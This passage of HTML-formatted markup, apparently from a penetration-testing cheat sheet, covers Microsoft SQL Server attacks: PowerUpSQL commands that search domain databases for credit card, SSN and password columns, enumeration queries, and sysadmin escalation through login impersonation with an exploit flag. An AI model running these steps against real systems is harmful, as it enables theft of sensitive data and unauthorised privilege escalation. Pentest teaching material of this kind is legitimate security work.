&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLColumnSampleDataThreaded&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Threads&lt;/span> &lt;span class="mf">10&lt;/span> &lt;span class="n">-Keyword&lt;/span> &lt;span class="s2">&amp;#34;credit,ssn,password&amp;#34;&lt;/span> &lt;span class="n">-SampleSize&lt;/span> &lt;span class="mf">2&lt;/span> &lt;span class="n">-ValidateCC&lt;/span> &lt;span class="n">-NoDefaults&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Find sensitive data based on column name, but only target databases with transparent encryption:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLDatabaseThreaded&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Threads&lt;/span> &lt;span class="mf">10&lt;/span> &lt;span class="n">-NoDefaults&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Where-Object&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">is_encrypted&lt;/span> &lt;span class="o">-eq&lt;/span> &lt;span class="s2">&amp;#34;TRUE&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLColumnSampleDataThreaded&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Threads&lt;/span> &lt;span class="mf">10&lt;/span> &lt;span class="n">-Keyword&lt;/span> &lt;span class="s2">&amp;#34;card, password&amp;#34;&lt;/span> &lt;span class="n">-SampleSize&lt;/span> &lt;span class="mf">2&lt;/span> &lt;span class="n">-ValidateCC&lt;/span> &lt;span class="n">-NoDefaults&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>After getting access to a SQL Server, interesting information can be gathered. These queries can be executed with &lt;code>HeidiSQL&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- Version
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">@@&lt;/span>&lt;span class="k">version&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Current User
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">SUSER_SNAME&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">SYSTEM_USER&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Check sa privileges
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">IS_SRVROLEMEMBER&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;sysadmin&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Current Role
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">user&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Current database
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">db_name&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- All logins on server (gives more results if executed with sa privs)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">server_principals&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">WHERE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">type_desc&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">!=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;SERVER_ROLE&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- All database users for a database
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">USE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="k">database&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">database_principals&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">WHERE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">type_desc&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">!=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;DATABASE_ROLE&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- List all sysadmin (gives more results if executed with sa privs)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">type_desc&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">is_disabled&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">server_principals&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">WHERE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">IS_SRVROLEMEMBER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;sysadmin&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- List all database roles (gives more results if executed with sa privs)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">USE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="k">database&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DP1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DatabaseRoleName&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">isnull&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">DP2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;No members&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DatabaseUserName&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">database_role_members&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DRM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">RIGHT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">OUTER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">JOIN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">database_principals&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DP1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">ON&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DRM&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">role_principal_id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DP1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">principal_id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">LEFT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">OUTER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">JOIN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">database_principals&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DP2&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">ON&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DRM&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">member_principal_id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DP2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">principal_id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">WHERE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DP1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="k">type&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;R&amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">ORDER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">BY&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DP1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Effective Permissions for the server (more permissions if executed with sa privs)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">fn_my_permissions&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">NULL&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;SERVER&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Effective Permissions for the database (more permissions if executed with sa privs)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">USE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="k">database&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">fn_my_permissions&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">NULL&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;DATABASE&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Active user token (gives more results if executed with sa privs)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">user_token&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Active login token (gives more results if executed with sa privs)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">login_token&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- List all databases
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">master&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">databases&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- List all tables in a database
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Database01&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">information_schema&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">tables&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Get row count and content of a table in a database
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">COUNT&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Database01&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">dbo&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Table01&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Database01&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">dbo&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Table01&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>or by &lt;code>Get-SQLQuery&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLQuery&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Query&lt;/span> &lt;span class="s2">&amp;#34;SELECT @@version&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="privilege-escalation">Privilege Escalation&lt;/h2>
&lt;p>&lt;strong>Summary of Points&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>OS Commands can be executed if you have a sysadmin login or have been provided explicit permissions to sensitive functionality&lt;/li>
&lt;li>Most command execution options in SQL Server run as the SQL Server service account&lt;/li>
&lt;li>SQL Server service account can be configured as:
&lt;ul>
&lt;li>Local User&lt;/li>
&lt;li>Domain User&lt;/li>
&lt;li>Domain Admin&lt;/li>
&lt;li>etc&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>SQL Server service account = Sysadmin (and implicitly the SQL Server service process)&lt;/li>
&lt;/ul>
&lt;p>A generic audit for MSSQL issues can be done via:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLAudit&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="public-to-sysadmin">Public to Sysadmin&lt;/h3>
&lt;p>&lt;strong>Insecure configurations are very common&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>Weak passwords
&lt;ul>
&lt;li>default SQL Server, default third party applications, custom SQL logins&lt;/li>
&lt;li>user enumeration helps ;)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Excessive permissions
&lt;ul>
&lt;li>startup procedures, dangerous stored procedures (RWX), xp creation, CLR creation&lt;/li>
&lt;li>impersonation, database ownership, database links, agent jobs&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>SQL Injection
&lt;ul>
&lt;li>EXECUTE AS LOGIN&lt;/li>
&lt;li>Signed procedures&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Out of date versions&lt;/li>
&lt;/ul>
&lt;p>An automatic check for public to sysadmin privilege escalation can be done via:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLEscalatePriv&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="public-to-sysadmin---impersonation">Public to Sysadmin - Impersonation&lt;/h4>
&lt;p>User Impersonation (EXECUTE AS): when EXECUTE AS is used, the execution context is switched to the specified login or user name. This allows impersonation of other users and logins to be able to access resources which means it can be abused to use privileges and objects available to other users.&lt;/p>
&lt;p>The following SQL query allows to find SQL Server logins which can be impersonated in the current database:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- HeidiSQL
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">distinct&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">server_permissions&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">INNER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">JOIN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">server_principals&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">ON&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">grantor_principal_id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">principal_id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">WHERE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">permission_name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;IMPERSONATE&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>or it can be done through &lt;code>PowerUpSQL&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLAuditPrivImpersonateLogin&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;sqluser&amp;#34;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s2">&amp;#34;Sql@123&amp;#34;&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Exploit sysadmin privileges through user impersonation (does not work if chanined/nested impersonation must be performed to get to &amp;ldquo;sa&amp;rdquo;, in fact only direct sa impersonation is supported):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLAuditPrivImpersonateLogin&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;sqluser&amp;#34;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s2">&amp;#34;Sql@123&amp;#34;&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span> &lt;span class="n">-Exploit&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The exploitation of chained/nested impersonation can be directly done by executing queries in &lt;code>HeidiSQL&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- HeidiSQL
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">SYSTEM_USER&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">IS_SRVROLEMEMBER&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;sysadmin&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
